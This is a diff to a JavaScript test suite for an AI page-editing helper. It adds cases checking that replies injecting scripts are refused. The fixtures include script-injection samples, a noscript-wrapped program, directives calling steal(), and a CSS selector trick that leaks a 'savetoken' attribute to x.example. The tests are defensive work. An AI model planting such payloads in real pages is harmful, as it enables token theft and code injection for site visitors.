@@ -638,6 +638,10 @@ describe("with a ready ai-edit helper", () => {
     ["an inert-onclick handler", '<button editmode:onclick inert-onclick="steal()">x</button>'],
     ["a jscript script", '<script type="text/jscript">steal()</script>'],
     ["a program type with a parameter", '<script type="text/x-clay-program; charset=utf-8" name="p">clay.fetch("x")</script>'],
+    ["a noscript holding a program a scripting-off parser reads", '<noscript><script type="text/x-clay-program" name="p">clay.fetch("x")</script></noscript>'],
+    ["a SapJS root with a text directive", '<span sap text="steal()">x</span>'],
+    ["a SapJS calc directive", '<b calc:total="steal()">x</b>'],
+    ["a stylesheet that reads attributes into URLs", '<style>html[savetoken^="a"]{background:u\\72l(https://x.example/a)}</style>'],
   ])("a reply that adds %s is refused", async (_label, extra) => {
     clickSection(mountPage());
     await submit("tighten");
@@ -645,6 +649,14 @@ describe("with a ready ai-edit helper", () => {
     await flush();
     expect(heading().textContent).toBe("Old heading");
     expect(barStatus().textContent).toMatch(/adds a script or event handler/);
+  });
+
+  test("a reply that adds an ordinary stylesheet is shown for Keep", async () => {
+    clickSection(mountPage());
+    await submit("make it red");
+    handle.settle({ state: "done", result: { html: '<section data-edit-id="hero"><h1>Old heading</h1><p>Old paragraph</p><style>.hero h1{color:#b00;background:url(/img/bg.png)}</style></section>', model: "m" } });
+    await flush();
+    expect(barButton("keep").hidden).toBe(false);
   });
 
   // Its attributes are the page's own, so only its code tells the reply apart, and edit
